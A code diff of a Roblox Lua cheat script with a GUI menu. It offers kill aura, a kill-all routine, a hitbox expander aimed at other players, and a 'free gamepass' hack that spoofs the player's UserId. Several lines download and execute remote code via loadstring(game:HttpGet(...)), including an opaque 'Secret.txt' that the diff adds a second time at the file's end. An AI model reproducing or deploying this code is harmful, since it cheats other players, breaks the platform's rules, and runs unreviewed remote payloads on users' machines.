@@ -1,5 +1,7 @@
+
 local players = game:GetService("Players")
-local plr = players.LocalPlayer 
+local lp = players.LocalPlayer
+
 
 --KillAura Setting
 _G.Aura =false
@@ -8,25 +10,22 @@ _G.AuraRange = 25
 --Misc 
 _G.FastKill = false
 
+--HitboxExpander
+_G.Hitbox_Size = 15
+_G.HitBox_Transparency = 0.4
+_G.Hitbox = true
+
 
 --local WeaponTable = {"Baseball Bat","Blood Dagger","Chainsaw","Electric Guitar","Emerald Greatsword","Frost Spear","Katana","Knife","Mace","Machete","Pan","Pencil","Scythe","Tennis Racket","Trident","War Hammer"}
 
-
-if _G.Loaded == false then
-	print("Stop Spamming Script Loaded")
-	return
-end
-
-_G.Loaded = false
-
 local success, err = pcall(function()
---Load menu
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/menu.txt"))()
+    --Load menu
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/menu.txt"))()
 end)
 
 function Alive()
-	local char = plr.Character or plr.Character.Parent
+	local char = lp.Character or lp.Character.Parent
 
 	if char then
 		return char
@@ -38,13 +37,13 @@ function KitEquip(Kit)
 end
 
 function ClosestPlayer(range)
-	local char = plr.Character
+	local char = lp.Character
 
 	local maxdist = range
 	local target
 
 	for i,v in ipairs(game:GetService("Players"):GetChildren()) do
-		if v.Name ~= plr.Name then
+		if v.Name ~= lp.Name then
 			local EChar = v.Character 
 
 			if EChar then
@@ -66,7 +65,7 @@ function ClosestPlayer(range)
 end
 
 function Aura(range)
-    local char = plr.Character
+    local char = lp.Character
 
 	local success, err = pcall(function()
 		local EPlr = ClosestPlayer(range)
@@ -85,17 +84,17 @@ function Aura(range)
 end
 
 function KillAll()
-    local char = plr.Character
+    local char = lp.Character
 
     for i,v in pairs(game:GetService("Players"):GetChildren()) do
-        if v.Name ~= plr.Name then        
+        if v.Name ~= lp.Name then        
             local EChar = v.Character
             if EChar then
-                if not plr.Backpack:FindFirstChildOfClass("Tool") then
+                if not lp.Backpack:FindFirstChildOfClass("Tool") then
                     KitEquip("Mace")
                 end 
                 if char:FindFirstChild("Kawaii Revolver") == nil then 
-                    plr.Backpack:FindFirstChild("Kawaii Revolver").Parent = char 
+                    lp.Backpack:FindFirstChild("Kawaii Revolver").Parent = char 
                 end
 
                 if char:FindFirstChildOfClass("Tool") == nil then return end
@@ -109,6 +108,28 @@ function KillAll()
         end 
     end 
 end
+
+function FreeGamepass(user)
+    lp.UserId = user
+end 
+
+
+function HitboxExpander(size,transparecny)
+
+    for i,v in pairs(players:GetChildren()) do
+        if v.Name ~= lp.Name then
+            local character =  v.Character or v.CharacterAdded:Wait()
+            local HRP = character:FindFirstChild("HumanoidRootPart")
+
+            if character and HRP then
+                HRP.Size = Vector3.new(size,size,size)
+                HRP.Transparency = transparecny
+            end
+            
+        end 
+    end 
+
+end 
 
 
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
@@ -134,7 +155,8 @@ local Window = Fluent:CreateWindow({
 local Tabs = {
     Main = Window:AddTab({ Title = "Combat", Icon = "swords" }),
     Misc = Window:AddTab({ Title = "Misc", Icon = "hammer" }),
-    Credit = Window:AddTab({ Title = "Info/Credit", Icon = "candy" }),
+    HitboxExp = Window:AddTab({ Title = "Hitbox-Expander", Icon = "box" }),
+    Credit = Window:AddTab({ Title = "Info/Credit", Icon = "apple" }),
     Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
 }
 
@@ -162,7 +184,7 @@ do
 			_G.Aura = true
 			while _G.Aura do 
                 if Alive() then
-                    Aura(25)
+                    Aura(_G.AuraRange)
                     task.wait(0.05)
                 end
 			end
@@ -171,6 +193,19 @@ do
 		end 
     end)
 
+    Tabs.Main:AddParagraph({
+        Title = "Info:",
+        Content = "Equip Kawaii Revolver To Fast Kill"
+    })
+
+
+    Tabs.Misc:AddButton({
+        Title = "Free gamepass",
+        Description = "Very important button",
+        Callback = function()
+            FreeGamepass("2205774994")
+        end
+    })
 
     local Kill = Tabs.Misc:AddToggle("MyToggle", {Title = "Fast Kill-All", Default = false })
 
@@ -187,6 +222,49 @@ do
 			_G.FastKill = false
 		end 
     end)
+
+
+    
+
+    local Kill = Tabs.HitboxExp:AddToggle("MyToggle", {Title = "Hitbox-Expand", Default = false })
+
+    Kill:OnChanged(function(value)
+		if value then 
+			_G.Hitbox = true
+			while _G.Hitbox do 
+                if Alive() then
+                    HitboxExpander(_G.HitboxSize,_G.HitBox_Transparency)
+                    task.wait(1)
+                end
+			end
+		else
+			_G.Hitbox = false
+		end 
+    end)
+
+    local AuraRange = Tabs.HitboxExp:AddSlider("Kil", {
+		Title = "Hitbox-Size",
+		Description = "Pisunom blyat",
+		Default = 20,
+		Min = 3,
+		Max = 50,
+		Rounding = 0,
+		Callback = function(Value)
+			_G.HitboxSize = Value
+		end
+    })
+    local AuraRange = Tabs.HitboxExp:AddSlider("Kil", {
+		Title = "Hitbox-Transparency",
+		Description = "Pisunom blyat",
+		Default = 0.4,
+		Min = 0,
+		Max = 1,
+		Rounding = 1,
+		Callback = function(Value)
+			_G.HitBox_Transparency = Value
+		end
+    })
+
 
 
     --credit
@@ -206,7 +284,6 @@ do
     })
 
 end
-
 -- Addons:
 
 SaveManager:SetLibrary(Fluent)
@@ -227,8 +304,5 @@ notify("You bad","Touch grass(I Don't know how touch grass)",5)
 
 SaveManager:LoadAutoloadConfig()
 
-
-
-
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
 
